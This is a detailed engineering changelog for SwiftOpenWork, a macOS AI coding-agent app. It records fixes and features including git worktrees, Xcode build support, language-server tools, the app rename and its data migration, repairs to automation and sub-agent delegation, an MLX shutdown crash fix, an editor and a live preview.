main thread. Every `worktree_create` froze the UI for the length of a git invocation, and under
XCTest it deadlocked the main queue badly enough to look like reentrancy.

Every entry point (`repositoryRoot`, `create`, `list`, `remove`, `isAgentWorktree`, `commit`,
`branchName`) is now `async` over a serial background queue, suspending the caller instead of
blocking it. `gitQueueForTesting` is exposed and `testGitRunsOffTheCallersThread` pins it.

**The tell is worth remembering: a test suite that passes and then hangs is usually a blocked main
queue, not a leaked process.** `sample` the test runner before killing it.

### Xcode projects were invisible to `build_project`

`BuildDiagnostics.command` knew SwiftPM and nothing else, so on this very repo the agent's build
tool did nothing. It now takes a `root`, discovers `.xcworkspace` (which wins) or `.xcodeproj`,
picks a shared scheme — preferring one matching the container name, falling back to the container
name itself — and quotes paths with spaces. `rerunCommand` narrows an xcodebuild test run with
`-only-testing:`, and refuses to narrow an unqualified suite name rather than guessing a target.
SwiftPM still wins where both exist.

### Live command output

`runProcess` and `executeShell` already drained their pipes chunk by chunk — they must, or a chatty
build deadlocks on a full pipe buffer — but the bytes went into a private buffer and surfaced only
at exit. A four-minute `xcodebuild` was four minutes of spinner, indistinguishable from a hang.

`LiveToolOutput` publishes those same chunks as they land: a bounded 24-line tail keyed by tool
call id for the running card, and a mirror into `WorkspaceTerminalSession` prefixed `[agent] $ …`
with a nonzero exit announced.

`ToolExecutionEngine.execute` gained an optional `callId` for the routing. It defaults to nil so
the tests, Shortcuts and `MockLLMService` call sites are untouched. **The mirroring deliberately
does not set the panel's `isRunning`/`activeProcess`** — Stop there means "stop the command I
typed", and claiming the agent's build would be a button that lies. There is a test for it.

### Inline diffs on tool cards

An edit card said only that it succeeded and named the path. Now it carries an `InlineFileDiff`:
`+N/−N` on the collapsed card, changed lines with two lines of context when expanded.

- **Stored rendered, not as both sides.** It rides in the session transcript, so a twenty-turn
  refactor of a large file must not carry forty copies of it. The real "before" is in the turn
  checkpoint; the file is on disk.
- **Real LCS, not a greedy walk.** A greedy diff reports an inserted line as "rewrote everything
  below it", which is the exact case a reviewer needs read correctly. Bounds: files over 4,000
  lines report counts with no body (the table is O(old × new)), rendered body caps at 60 lines.
- **Single-file tools only.** `rename_symbol`, `terminal_command` and `revert_changes` get none —
  showing one of the eleven files a rename touched is worse than showing none, and the turn review
  sheet covers the whole set.
- `VisualDiffInspectorView` now shares `InlineFileDiff.diff`, so the sheet and the card cannot
  disagree about a file. Its own diff had the greedy flaw.

### Four controls that did not control anything

Same rule as the settings sweeps, one layer out again.

- **The Side-by-Side / Unified picker rendered nothing.** It bound to `@State` no other line read,
  and since `.split` was the *default*, the control's resting position asserted something untrue
  about what was on screen. There is a real two-pane rendering now, padded so an insertion on one
  side leaves a shaded gap on the other instead of knocking every later line out of step with its
  counterpart. Persisted via `@AppStorage`.
- **"Apply & Save Changes" saved nothing.** In the turn review sheet the agent had already written
  the file and `onAccept` was `{}`. `onAccept` is optional now, the sheet passes nil, and the one
  real action is relabelled "Revert This File".
- **Finish notifications.** The chime existed and answered "something happened" but never which
  session, and it is gone the moment it ends. `TurnCompletionNotifier` posts a banner too. The
  decision is a `nonisolated` pure function so the rules are testable without a notification
  centre or a permission grant: silent when the app is frontmost, silent under 20 seconds, but a
  turn that **failed** is announced however short — that is the one you would otherwise come back
  to and find nothing happened. Authorization is requested on first use, not at launch, and
  `UNUserNotificationCenter.current()` is guarded on `Bundle.main.bundleIdentifier` because it
  traps outside a bundle.
- **Context meter** in the composer bar. Reads the provider's own prompt-token count for the last
  turn against the model's window; amber past 60%, red past 85%, hidden below 50% because an
  always-on meter is furniture. **It shows nothing rather than a guess** when a session has no
  reply yet — estimating from character counts ignores the system prompt, the tool schemas and
  every tool result the model saw.

`NoDeadFeaturesTests` gained two cases for this class: a control the user can change must change
something, and a button that claims to save must save.

### Composer and transcript

Drag-and-drop and paste of files and images straight into the box (`ComposerAttachmentIntake` plus
overrides on the `NSTextView`), `@file`/`@folder` completion, and `@path:line` which injects a
numbered excerpt around that line rather than the whole file. Clicking a `file:line` diagnostic in
tool output reveals it and drops the mention into the composer. Sticky session todos from
`todo_write` persist on the `Session`. Plan mode has a banner and `/plan`.

**Stop no longer throws away what you typed.** A message written while the agent was generating is
queued and offered with a "Send now" button rather than silently discarded.

`rename_symbol` renames an identifier across the workspace from its declaration, with `dry_run`.

---

## What landed 2026-09-16 (sixth pass): wiring audit, and closing "What is left"

Every type added in the fourth and fifth passes was checked for a caller outside its own file
and tests, and the app was launched and driven. All of them are wired. The audit still found
four real bugs, two of them serious.

### Found while auditing

- **Every test run fired your real startup automations.** The unit tests are hosted by the app,
  so `xcodebuild test` launches it against the real Application Support folder, and the
  fifth pass started `AutomationScheduler` in `onAppear`. Each run made a real agent turn, a new
  `MorningBrief` session and a rewritten `lastRunAt`. Six stray `MorningBrief` sessions on this
  machine came from that (15 Sep 22:45 and 22:55 UTC, 16 Sep 11:01 and 11:08 UTC). They were
  **not deleted**, which is your call. `AutomationScheduler.isHostedByTests` now blocks
  `start`, and the automatic update check uses the same guard.
- **The mic button would crash the app.** Info.plist had no `NSMicrophoneUsageDescription` or
  `NSSpeechRecognitionUsageDescription`, and macOS terminates an app that touches either without
  one. Both are now in `project.yml`, plus `NSAppleEventsUsageDescription` for the osascript
  bridge. Denied speech permission used to be a `print`, so the button did nothing. It now shows
  a toast.
- **`rename_symbol` could silently do half a rename.** Files were found through `CodeSearch.grep`
  capped at 2,000 matches, and `grep` itself only looked at the first 5,000 files without
  setting `truncated`. Both limits are now reported, and rename refuses to write when the
  search was cut off.
- **`TurnCompletionNotifier` and `AgentWorktreeTests`** had Swift 6 concurrency warnings. They are
  fixed. Two older warnings in `BuiltInProviderDefaultTests` and `MLXParametersAndDeadlineTests`
  are still there.

### Closed from "What is left"

- **Update checking is real.** `UpdateChecker` reads `releases/latest` from the GitHub repo. The
  button reports up to date, newer (with a link), or *could not check*, and a rate limit or a
  non-version tag is never shown as up to date. `autoCheckForUpdates` now controls a check at
  launch, at most once a day. It never downloads anything.
- **The cloud settings are deleted.** There is no cloud service, so the Cloud Account and Connect
  pages and their four fields were removed. Old settings files still decode (`RemovedSettingsTests`), and a
  saved `cloud`/`connect` settings tab reopens on General. `knownDead` in `NoDeadSettingsTests`
  now holds only `startOnLogin` and `settingsSchemaVersion`.
- **Local Models › Folders** lists every folder the scan searched, each with Reveal, plus Add
  Models Folder and Rescan. Its first version rendered an empty list, because popover content
  did not see state set in the same click. It now loads its own state in `onAppear`. Checked
  in the running app: 9 folders listed.
- **`rename_symbol` uses the compiler in Swift packages** (`SourceKitRename`, an LSP client for
  `sourcekit-lsp`; since replaced by `SemanticRename` on the shared LSP layer, see *Language
  servers* below). In the test, renaming `Alpha.value` changes its call site and leaves
  `Beta.value` and a comment alone. `mode` is `auto` (the default), `semantic` or `text`, and
  the output always names the method used. Rules worth keeping:
  1. **Wait for indexing before renaming.** A rename sent early covers only the files already
     indexed and looks complete. It waits for the `indexing.*` progress token and indexing logs
     to go quiet, and a timeout is a failure.
  2. **Merge edits by resolved path.** The server named one file as both `/var/…` and
     `/private/var/…`, and it was edited twice. A test caught this.
  3. **An edit that does not fit the file rejects the whole rename.** Half a rename does not
     compile either.
  4. **Xcode-only projects stay text-only.** Without a build server, `sourcekit-lsp` returns
     only the declaring file, which looks like success. `auto` falls back and says why;
     `semantic` refuses.
- **Multi-file diffs.** `rename_symbol` carries `fileDiffs`. The collapsed card shows file count
  and totals, and the expanded card lists every file. `InlineFileDiff.boundedSet` keeps every
  path and count and drops bodies past 12 files or 240 lines.
- **cargo re-runs can be narrowed:** `cargo test -- --exact 'a::b' …`, using names from libtest's
  `test … FAILED` lines. Doc-tests are skipped. **npm stays whole-suite on purpose:** `npm test`
  runs any runner, and a filter one runner honours another ignores.
- **Release script.** `Scripts/notarize-release.sh` builds Release, signs nested code first
  instead of `--deep`, signs with hardened runtime and `Scripts/OpenWork-release.entitlements`
  (microphone and Apple Events, which hardened runtime otherwise blocks), notarises, staples,
  checks with `spctl`, and zips **after** stapling to `build/release/OpenWork.zip`. The old
  script zipped before stapling and deleted that zip. `SIGN_ONLY=1` stops before submitting; it
  ran end to end here with `OpenWork Local Signing`.

---

## Renamed to SwiftOpenWork (2026-09-16)

Another app is already called OpenWork, and `ai.openwork` is its domain, so this app now uses
its own name everywhere. **`AppIdentity` (`Sources/Utils/`) is the single place the name and
identifiers live**; nothing new should spell them out.

| | 1.1 | Now |
|---|---|---|
| App | `OpenWork.app`, display name OpenWork | `SwiftOpenWork.app`, SwiftOpenWork |
| Xcode project, scheme, module, tests | `OpenWorkSwift…` | `SwiftOpenWork…` |
| Bundle ID | `ai.openwork.OpenWorkSwift` | `io.github.foscoe63.SwiftOpenWork` |
| Keychain service, log subsystem | `ai.openwork.OpenWorkSwift`, `ai.openwork` | the bundle ID |
| Settings, sessions, agents | `~/Library/Application Support/OpenWorkSwift` | `…/SwiftOpenWork` |
| Home data | `~/.openwork` | `~/.swiftopenwork` |
| Rules file written | `OPENWORK.md` | `SWIFTOPENWORK.md` |
| Agent worktrees | `.openwork-worktrees`, `openwork/<task>` | `.swiftopenwork-worktrees`, `swiftopenwork/<task>` |
| New workspaces | `~/Documents/OpenWork/Workspaces` | `~/Documents/SwiftOpenWork/Workspaces` |
| Local signing certificate | `OpenWork Local Signing` | `SwiftOpenWork Local Signing` |
| Release zip | `OpenWork.zip` | `SwiftOpenWork.zip` |

The name was briefly **OpenWork-Swift** (`io.github.foscoe63.OpenWorkSwift`) the same morning and
then changed to SwiftOpenWork to be unmistakably different. That name never shipped and nothing
migrates from it, except the lead agent's name, which test runs had already written.

A new bundle ID is a new app to macOS. `LegacyIdentityMigration` runs before `AppState` loads
anything, and only once per install:

- **Application Support/OpenWorkSwift → SwiftOpenWork.** Settings, sessions, agents and
  automations. This is the move that matters.
- **`~/.openwork` → `~/.swiftopenwork`.**
- **Preferences** are copied from the old domain, with this app's own keys renamed (window
  layout, update-check stamp, window frame).
- **Keychain secrets migrate lazily.** `KeychainManager.getSecret` falls back to the old service
  on a miss and copies what it finds, so macOS asks only about credentials in use. Deleting or
  clearing a secret removes the 1.1 copy too; otherwise the fallback would bring it back.
- **The seeded lead agent** is renamed in saved `agents.json` where it still has the seed's
  wording. The pattern has a `(?<!Swift)` lookbehind because "SwiftOpenWork Lead Agent" itself
  contains "OpenWork Lead Agent"; without it every launch would prepend another "Swift".

**Before the first real launch, 1.1 data wins over anything under the new name.** The tests run
inside the app on the real home folder, so on a development machine `SwiftOpenWork/` (seed files),
`~/.swiftopenwork` and the new preferences domain already exist before the renamed app has ever
been opened. On this Mac they do, as of the last test run. A folder in the way is renamed
`<name>.before-migration-<timestamp>`, never deleted or merged, and the 1.1 folder takes its place.
Keeping the test-host copy would have looked like every session had been lost. Once the migration
has run it never runs again, so nothing a real launch writes can be displaced. Until the first real
launch, `VisionDetectionTests.testTheInstalledDefaultModelIsDetectedCorrectly` skips, because the
test host reads the seed settings rather than yours.

The 1.1 names are still **read**: `OPENWORK.md` and `.openwork.md` rule files (Save writes back to
the one that was loaded instead of shadowing it with a new file), worktrees under the old
folder and branch prefix, and old Keychain items. Existing workspaces keep their stored paths;
moving someone's project folders is not a rename's job.

**What cannot be migrated by an app:** Accessibility and Screen Recording belong to the bundle ID,
so they must be granted again, and the old "OpenWork" entries removed from System Settings.
Shortcuts built on the old intents must be re-added. `OpenWork.zip` in `build/release`, notarised
earlier the same day, is the old identity and must not be published.

---

## Automations that never finished, and multi-agent delegation (2026-09-16)

Started from "the MorningBrief sessions have a prompt and no reply". There were 25 of them, all
filed as successes, and `/Volumes/WorkSpaces/OpenWorkSwift`, where the brief writes its notes, was
empty. Four separate faults stacked up, and none of them was a crash.

**1. Runs were saved at the start and the end only.** `HeadlessAgentTurn` (automations, Shortcuts,
Siri) saved the session twice; a chat turn saves on every message update. Any run that did not
finish left a prompt with no reply, however much it had done. Test hosts exit in seconds, and
launches during the Cursor work were quit before a ten-minute run ended. It now saves as it goes.

**2. "Success" was written when a run started.** Claiming `lastRunAt` up front is right (a crashing
run must not re-fire every tick), but the status went with it. `recordAutomationRunStarted` now
writes `running` and the run's session id (`Automation.lastSessionId`). At launch, when nothing can
be running, `AppState.recoveringInterruptedRuns` turns a leftover `running` into `interrupted` and
appends " (interrupted)" to that session's title. Launch only: Settings also calls `loadAll`, while
a run may be in flight.

**3. Inventory mode took every tool away.** `isMCPInventoryPrompt` matched any prompt mentioning
"mcp" beside "configured" or "mcp-server". The brief's step 6 does, so every run had no tools and
was told to answer with one table. The finished run said so: "this turn I'm restricted from calling
tools directly". The README's own example prompt tripped it too. It now only matches short questions
about servers (at most 120 characters, with no verb that uses one), and `MCPInventoryPromptTests`
covers both sides.

**4. Keyword delegation.** Any prompt containing "build", "create", "project", "research",
"analyze", "agent", "team", "subagent" or "refactor" sent the *whole* prompt to the first two team
members at once, before the lead did anything, with six steps each. On one local model every agent
switch re-read the prompt ("Context cache reset"), the lead thought for four minutes, and the
research sub-agent ran out of steps every time. **Removed.** The lead decides with `agent_spawn`.

### Making `agent_spawn` the path that works

Removing the keyword path would have broken delegation outright, because the tool path had its own
faults:

- **Wrong model.** A sub-agent ran on its *configured* model, and the seeded team is configured for
  Ollama models on a machine where Ollama is off. `AgentRunContext.subAgentModel` uses the agent's
  own model only when its provider is on and, for a local provider, lists the model. Otherwise it
  inherits the running model and the report says so. Inheriting also avoids loading a second local
  checkpoint beside the parent's.
- **No real depth.** Every spawn called itself depth 1, so the budget never stopped a chain. Depth
  and the running model now travel as a `@TaskLocal` (`AgentRunContext.current`) set around every
  tool call in `AgentRunner` and `SubAgentExecutor`.
- **The lead was not told who its team was.** It had the tool but no ids. `teamPromptSection` lists
  the team and says when to delegate: self-contained work for a specialist, not short or sequential
  steps. On a local model it adds that delegating is expensive.
- **Delegations were invisible.** `createdSubAgentTask` had no reader (same bug class as
  `createdAgentMessage` in the fourth pass). It now reaches the message's task cards, the Sub-Agent
  Tree and the Agent Messages log, and the sub-agent's steps stream into the tool card's live tail.
- **Silent guesses.** A missing `target_agent_id` defaulted to `coder-agent`, and an agent could
  spawn itself. Both are now refused with the list of agents.
- **Worktree litter.** Every sub-agent left a worktree and branch behind, even read-only research.
  One with no changed files and no commits is now removed.
- **Three dead agent controls, now wired.** *Auto-Delegate Complex Tasks* decides whether the team
  section encourages delegation or says "only when asked". *Can Communicate with Other Agents*
  gates `agent_message`. *Max Sub-Agent Nesting Depth* narrows the global depth budget.

**The Collaboration Room invented results.** When a model returned nothing it showed a hardcoded
plan, hardcoded code and a hardcoded "✅ Verified … No race conditions detected. Ready for merge",
then "Team Consensus Reached". Chunks were applied on later main-actor hops, so a model that *did*
answer could still read as empty and get the fake text. It also picked agents by hardcoded id.
Now it streams into a synchronous buffer, takes its roles from the lead's team, stops and says why
on a failure, and states that it is text only.

**The Visual Flow builder is deleted.** "Execute Pipeline" animated the connector lines on a timer
and toasted "Multi-Agent Pipeline executed successfully!" Its nodes were not linked to agents and
nothing was saved. A real one would be a feature of its own.

Still worth knowing: headless runs do not set `isGenerating`, so a chat turn started during a
scheduled run shares the local model with it, and the header says "Agent ready" throughout.

---

## Language servers: code intelligence for agents (2026-09-16)

The only LSP client used to be a single-purpose one inside `rename_symbol`: it started
`sourcekit-lsp`, guessed when indexing was done, renamed, and quit. It is now a general layer in
`Sources/Engine/LSP/`, and agents have six read-only tools on top of it:

| Tool | Asks the server for |
|---|---|
| `go_to_definition` | definition, declaration, type definition or implementation (`kind`) |
| `find_references` | every use of *that* declaration, not same-named symbols |
| `symbol_info` | hover text (signature, docs) plus where it is declared |
| `code_diagnostics` | errors and warnings for one file, as `path:line:col: error:` so the card links them |
| `document_symbols` | an outline of one file |
| `call_hierarchy` | call sites (`incoming`) or callees (`outgoing`) |

Agents address a position by file, 1-based line and the symbol name as written; `column` is only
needed when the name appears twice on the line. None of the tools need approval, and plan mode
keeps them.

**Layers, bottom up:**

- `LSPConnection`: JSON-RPC framing and request matching. A waiting request always ends: with a
  response, a timeout, cancellation of the calling task (which sends `$/cancelRequest`), or the
  server exiting. A malformed header kills the connection instead of being skipped. The last lines
  of the server's stderr are quoted in the error.
- `LanguageServerCatalog`: which server handles a file, and its project root. The catalog covers
  sourcekit-lsp, clangd, TypeScript, pyright/basedpyright, rust-analyzer and gopls.
  **A server is only used with a root marker** (`Package.swift`, `compile_commands.json`,
  `tsconfig.json`, `Cargo.toml`, `go.mod`…) found between the file and the workspace folder, never
  above it. Without one, servers answer from the open file alone, and that looks complete.
  `ExecutableLocator` searches Homebrew, `~/.cargo/bin`, `~/go/bin`, `~/.swiftly/bin` and the npm
  directories as well as `PATH`, because an app opened from the Finder gets a minimal `PATH`. It
  passes that search path on to the server, since Node-based servers need to find `node`.
  sourcekit-lsp comes from `DEVELOPER_DIR`, then an Xcode that `xcode-select` points at, then the
  newest Xcode by version number, and only then the Command Line Tools.
- `LanguageServerSession`: one long-lived server per root. Before every request it re-reads the
  files it names from disk and forwards file-system events (`FileChangeWatcher`, FSEvents) as
  `workspace/didChangeWatchedFiles`. Tools that write files also notify the pool directly, because
  FSEvents arrive a moment late.
- `LanguageServerPool`: starts servers on first use, restarts a dead one and says so in the
  answer, gives up after three crashes in five minutes, and stops servers idle for ten minutes.
  `applicationWillTerminate` kills anything still running.
- `CodeIntelligence` formats the answers. `SemanticRename` is the compiler half of `rename_symbol`.

**sourcekit-lsp behaviours the tests uncovered:**

1. **`workspace/synchronize` with `{"index": true}` is the readiness signal.** It blocks until
   background indexing is done, which replaces the old "no progress for three seconds" guess.
   `_pollIndex` no longer exists. Adding `buildServerUpdates` makes the whole request fail as
   "an experimental request option". Servers without `synchronize` fall back to waiting until
   work-done progress stops.
2. **A new file is only indexed if it is reported as *created*.** Reported as changed, it is
   silently left out of the package, and references to it are missing. `FileChangeWatcher.classify`
   maps the FSEvents created and renamed flags to created (an atomic save counts too, at the cost
   of a package reload). Tool writes use the diff kind the engine already computes.
3. **Workspace trust.** sourcekit-lsp can ask whether to trust a workspace's configuration. The
   client declines, because an agent's workspace may be an unvetted repository.

**Rename is stricter than before.** In order: the root must exist, indexing must finish,
`prepareRename` must accept the position, and every edit's range must currently hold the old
name. Edits that restate unchanged text, such as argument labels, are skipped rather than
rejected. On a declaration line such as `func scale(scale: Int)`, the name after the declaration
keyword is chosen. If a write fails partway, the files already written are restored and the error
says so. That error (`writeFailed`) never falls back to text replacement.

**Which servers have actually been run.** sourcekit-lsp and clangd are installed here and tested
on every run. TypeScript 7 (`tsc --lsp`) and pyright were installed temporarily and passed
`testTypeScriptAnswersThroughTheGenericPath` and `testPyrightAnswersThroughTheGenericPath`. Those
two tests skip unless a server is on the search path; run them with, for example,
`PATH=<dir>/node_modules/.bin:$PATH`. typescript-language-server with TypeScript 5 was checked by
hand against the protocol only. rust-analyzer and gopls have never been run: no Rust or Go
toolchain was installed then; both have since been installed and tested (see *1.2.0 released*). clangd has neither `synchronize` nor pull diagnostics, so it tests the
fallbacks. A test gotcha: in `add(1, 2) + missing` clang drops the whole expression, so `add` has
no definition there. Keep errors on their own line in fixtures.

**TypeScript 7 broke the obvious install.** `npm install typescript typescript-language-server`
now installs TypeScript 7, which is a native compiler with no `tsserver`. typescript-language-server
then fails to start ("Could not find a valid TypeScript installation"). TypeScript 7 has its own
server, `tsc --lsp --stdio`, so the catalog entry (`typescript`) reads the TypeScript version:
7 or later uses `tsc`, earlier versions use typescript-language-server. The project's own
`node_modules/.bin` is checked before the search path.

Tests: `LSPConnectionTests` uses pipes with no server, `CodeIntelligenceTests` is pure, and
`LanguageServerIntegrationTests` runs the real sourcekit-lsp and clangd. One sourcekit test runs
every query on one package, edits files behind the server's back, adds a file and `SIGKILL`s the
server. It takes about five seconds, because the toy package indexes quickly.

## Closing the open items (2026-09-16)

- **`LoopBreakerTests` failed on every run because the test was out of date.** The detector had
  been deliberately loosened (8-word n-grams, and three similar lines in a row rather than two),
  and its own comment names this test's list as the false positive it fixes. The test now asserts
  that such a list is *not* flagged, and a new test checks that a repeating sentence still is.
- **`testTheBuiltBundleMatchesAppIdentity` failed under SwiftPM.** It meant to skip there, but
  checked for an ID ending in `xctest`, and the real one is `com.apple.dt.xctest.tool`. It now
  skips unless the host is an `.app`, and passes under `xcodebuild test`.
- **Indexing progress on the card.** `SessionEvents` keeps each open `$/progress` title, message
  and percentage. While a language-server tool waits for the index, the card shows lines such as
  `sourcekit-lsp: Indexing: 12 / 40 (30%)`. This covers `rename_symbol` too.
- **Tests have their own data folder** (see *Environment gotchas*). `VisionDetectionTests` still
  checks the model this machine actually uses, reading that one value from the real settings
  file without writing it.
- **TypeScript and pyright tried.** See *Language servers*. TypeScript 7 needed a catalog change.

Verified: `swift test` and `xcodebuild test` both pass with no failures (703 tests after the Xcode work below). The
TypeScript and pyright tests pass when those servers are installed and skip otherwise.

## Code intelligence for Xcode projects (2026-09-16)

Projects with an `.xcodeproj` or `.xcworkspace` and no `Package.swift` used to get a refusal
from every language-server tool. They now work through `xcode-build-server` (Homebrew), which
sourcekit-lsp talks to through `buildServer.json`.

**`setup_xcode_language_server`** (needs approval, blocked in plan mode) finds the container
and scheme with the same rules as `build_project` (`BuildDiagnostics.xcodeContainer`). It runs
`xcode-build-server config` with Xcode's `DEVELOPER_DIR`, and builds the scheme if it has never
been built (`build: true` always builds, `false` never does). It then stops any server already
running for that folder. The card shows the diff of `buildServer.json`, and the output reminds
the user to gitignore it, since it holds absolute paths. Before setup, the tools say to run it
(`Unavailable.xcodeProjectNeedsSetup`) instead of the generic "needs Package.swift".

**What was learned by running it by hand first:**

1. **`xcode-build-server` shells out to `xcodebuild`.** On this machine `xcode-select` points at
   the Command Line Tools, which have no `xcodebuild`, so without `DEVELOPER_DIR` it fails with a
   Python traceback. The commands pin it.
2. **It does not index.** Answers come from the index Xcode wrote in its last build. A file added
   afterwards is missing from references until the next build. After a rebuild, a server that is
   already running sees the new index immediately, with no restart. So
   `XcodeBuildServer.freshness` compares source-file modification times with the newest
   `.xcactivitylog`, and every answer for such a project says how old the index is and which
   files changed since. **A compiler rename refuses while the index is stale**; `auto` falls back
   to text and says why, `semantic` fails.
3. **`workspace/synchronize` returned before build settings arrived.** The first query after
   opening a file then got single-file answers: definition was `null` on one run and correct on
   the next. The `buildServerUpdates` option fixes that, but it is refused as experimental unless
   the server is started with `initializationOptions`
   `{"experimentalFeatures":["synchronize-for-build-system-updates"]}`. sourcekit-lsp is now always
   started that way. A server that still refuses the option gets the index-only request.

`XcodeBuildServerTests` covers config parsing, staleness, the refusal message, command quoting and
gating. It also generates a real framework project with xcodegen and checks: refusal before
setup; setup and build; references for `Alpha.value` only; a file added afterwards reported as
changed, with rename refused and nothing written; a rebuild through the tool, after which
references include the new file. It removes its own `XToy-*` folder from DerivedData.

## 1.2.0 released, and the MLX exit crash fixed (2026-09-16)

**Release.** `MARKETING_VERSION` 1.2.0, build 2, tag `1.2.0`, published as the latest GitHub
release with `SwiftOpenWork.zip` (sha256 `066e0ed5…df73aa`). Built Release with
`SIGN_ONLY=1 DEVELOPER_ID_APP="Developer ID Application: Edward Griswold (5XKHL47YG3)"
Scripts/notarize-release.sh`, zipped with `ditto`, and checked by unzipping and
`codesign --verify --deep --strict`. **Not notarised:** the issuer ID was not on this machine, so
Gatekeeper reports "Unnotarized Developer ID", and the release notes say how to open it. A Release
launch was smoke-tested with `XCTestBundlePath=/dev/null` (isolated data, no startup automations).
The GitHub `releases/latest` API that `UpdateChecker` reads returns 1.2.0.

**MLX exit crash: a real bug, not a test quirk.** macOS kept eight crash reports from runs that
passed and then died at exit. In the five read closely, the main thread was inside `exit` →
`__cxa_finalize` destroying MLX's `Scheduler`, `ThreadPool` or `CompilerCache`, while a Swift
concurrency thread was still in `mlx_async_eval` or `CompilerCache::find`. Stopping to read a
generation stream only *asks* mlx-swift-lm's session task to stop, and `streamInProcess` returned
at once while the GPU work carried on. A user quitting mid-reply would hit the same crash.
Reproduced by cancelling a real Ornith generation after five tokens and letting the test exit:
exit 139 once and 134 twice in three runs.

Fixed in `NativeMLXService`:
- The stream is read in a task the service owns, and `streamChat` does not return until
  `ChatSession.synchronize()` has waited out the KV-cache lock the generation holds (capped at
  15s; a long prefill does not check cancellation).
- Running generations are registered, and `prepareForExit` (called from
  `applicationWillTerminate`) cancels them and waits up to 3s.

After the fix: five runs of the same repro, all exit 0. `MLXGenerationShutdownTests` checks the
invariant: no active generation and no further tokens once the call returns, and that preparing
for exit stops a running generation. It needs the Ornith model and skips without it, as on CI.

**rust-analyzer and gopls tested.** Installed with Homebrew (`rust`, `rust-analyzer`, `go`,
`gopls`). `testRustAnalyzerAnswersThroughTheGenericPath` and `testGoplsAnswersThroughTheGenericPath`
cover definition, references and diagnostics, and passed four runs in a row. Every server in the
catalog has now been run through the app's own code.

## What landed 2026-09-17 (seventh pass): local engine, editor, live preview

Asked for: make local models, seeing the result, editing code yourself, and polish "very good".
Every claim below was checked live — a real 35B model, a real `npm run dev`, a real web view, and
the built app driven through its UI on throwaway data.

### Local models

- **The system prompt was re-prefilled on every continued turn.** `ChatSession` prepends its
  `instructions` on *every* call, including calls that continue a live KV cache (its own docs:
  "re-tokenized on each call"). `NativeMLXService` passed the system prompt as `instructions` and
  reused sessions, so every turn and every tool round appended the whole prompt — tool schemas and
  workspace context — to the cache again. Measured on Ornith-1.5-35B with a 490-token system
  prompt: turn two, adding a six-word message, prefilled **499** tokens. The system prompt is now
  the first message of the session's `history`; the same turn prefills **14**. In a twenty-step
  agent run that was twenty extra copies of the prompt displacing real context.
  `SystemPromptIsRenderedOnceTests` reads the source so `ChatSession(instructions:)` cannot come back.
- **Concurrent generations corrupted each other's cache bookkeeping.** Chat turns, automations,
  Shortcuts and parallel sub-agents all shared one `cachedSession`/`cachedConsumed`; an automation
  arriving mid-turn replaced the session a chat turn was streaming from, and the chat turn's
  cleanup then recorded its reply against the automation's history. `LocalGenerationGate` (an
  actor, FIFO, cancellable while queued) now serialises load + generate + bookkeeping, and a
  queued turn shows "Waiting for the local model — it is busy with background run “Morning
  Brief”". Labels come from a task-local set in `HeadlessAgentTurn` and `SubAgentExecutor`.
  Verified live: two simultaneous turns, the second queued with that notice, both answered.
- **Two cached sessions (`maxCachedChats`), chosen by `MLXSessionReuse.select`**, so a chat and an
  automation taking turns do not each rebuild the other's cache. A conversation none of them
  belongs to is new, not a "Context cache reset" — that chip is now only shown for real resets.
- **The chat header named nothing during background runs.** `AppState.backgroundRuns` →
  "Agent ready · “Morning Brief” running in background" with a blue dot.
- **The context meter never appeared for local models** — the MLX path sent no `promptTokens`.
  It now reports the tokens in view (cached prefix + prefilled), which on a continued session is
  not the same as MLX's per-call `promptTokenCount`.
- **Replies show measured decode speed** (`generationTokensPerSecond`, persisted).
- **Unload did not free memory.** `unload`/`unloadAll` removed the container but the cached
  `ChatSession` still held it. They now drop matching cached sessions and clear MLX's cache.
- **Multimodal checkpoints declared half their context.** Ornith, Qwen3.6 and Qwen3.8 keep
  `max_position_embeddings` under `text_config`; discovery read only the top level and fell back to
  131,072. `LocalMLXEngine.declaredContextWindow` reads nested configs (262,144).

### Editor (`Sources/Engine/Editor`, `Sources/UI/Views/Editor`)

- `EditorWorkspace` / `EditorDocument`: tabs whose `NSTextStorage` and `UndoManager` live on the
  document, so switching tabs keeps undo and unsaved edits. Opens from build errors
  (`revealDiagnostic` no longer reveals in Finder and pastes a mention), tool-card diffs (file name
  → first changed line), preview console stack traces, Quick Open (⇧⌘O), Artifacts & Files.
- **Agent-aware disk sync** (`EditorDiskSync.decide`): polled `stat` every 1.5s and after each turn.
  Clean tab → reload quietly with a notice. Unsaved edits → conflict banner (Compare / Take Disk /
  Keep Mine); `save()` throws until resolved, so nothing the agent wrote is overwritten unseen.
  Deleted → banner, Save writes it back. Polling, not vnode watchers, because atomic renames
  replace the watched inode.
- CRLF and indentation are detected and preserved. **Trap:** `"\r\n"` is one `Character`, so
  `text.contains("\r")` is false for CRLF text — check `utf16`.
- `SyntaxHighlighter`: one left-to-right lexer per language family, UTF-16 ranges, applied as
  layout-manager temporary attributes off the main thread. Strings/comments first, so `//` in a
  string stays a string.
- `CodeTextView`: auto-indent (opens `{|}` pairs), Tab completes a word in progress (document words →
  workspace declarations via `SymbolIndex.declaredNames` → keywords) and indents otherwise, ⌘/,
  ⌘] ⌘[, ⌘L, ⌘S, ⌘F (find bar; `TextEditingCommands` added), ⌘-click to definition.
- Composer banner when editor files are unsaved: the agent reads disk.
- **AppKit trap found live:** on this macOS a vertical ruler is laid *over* a full-width clip view
  and the text is inset with a negative bounds origin (x = −ruleThickness). Scrolling the clip view
  to x = 0 hid the first characters of every line under the line numbers.
  `Coordinator.leftmostOriginX` derives the real leftmost origin.

### Live preview (`Sources/Engine/Preview`, `Sources/UI/Views/Preview`)

- `DevServerManager`: long-lived servers outside any tool call (`terminal_command` kills after
  120s). Login-shell PATH resolved once with a timeout (nvm/Homebrew node from a Dock launch),
  `BROWSER=none`, stdin at EOF, URL detected from output (Vite/Next/Python/Rails banners, ANSI
  stripped, wildcard binds → localhost), else from `lsof` of the process tree, then confirmed by an
  HTTP answer. Stop signals the **whole tree** (`ps` parse) then SIGKILLs survivors; quitting the app
  kills all. Verified: `npm run dev` → npm → sh → node all dead and the port released.
- `StaticFileServer` (Network.framework, loopback only, traversal and symlink escapes refused) for
  plain sites — no `python3` stub installer prompt.
- `PreviewController`: one `WKWebView` that outlives the pane; injected script forwards console,
  uncaught errors, unhandled rejections, failed fetch/XHR and resource errors; console resets per
  page load; non-loopback links open in the browser; alerts are logged, not shown (an unattended
  check would hang). Parked in an offscreen window when the pane is hidden, so checks still render
  — the live test asserts the screenshot pixels are the page's colour. **Trap:** WebKit's
  `error.stack` omits the message V8 includes; send `name: message` + stack.
